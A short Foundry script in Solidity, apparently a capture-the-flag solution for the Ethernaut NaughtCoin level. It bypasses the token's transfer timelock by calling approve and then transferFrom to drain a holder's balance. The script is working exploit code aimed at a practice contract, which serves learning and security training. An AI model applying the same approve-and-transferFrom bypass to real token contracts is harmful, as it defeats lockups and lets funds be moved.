// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";

interface INaughtCoin {
    function balanceOf(address _owner) external view returns (uint256);

    function approve(address _spender, uint256 _value) external returns (bool);

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external returns (bool);
}

contract PoC is Script {
    INaughtCoin naughty =
        INaughtCoin(0xC595d7C946910835637D23F231441700Be6A25F8);

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        address futurCoinOwner = 0x1234567890AbcdEF1234567890aBcdef12345678;

        uint balance = naughty.balanceOf(futurCoinOwner);
        console2.log("Current balance: ", balance);

        naughty.approve(futurCoinOwner, balance);
        naughty.transferFrom(futurCoinOwner, address(naughty), balance);

        console2.log("New balance is: ", naughty.balanceOf(futurCoinOwner));

        vm.stopBroadcast();
    }
}
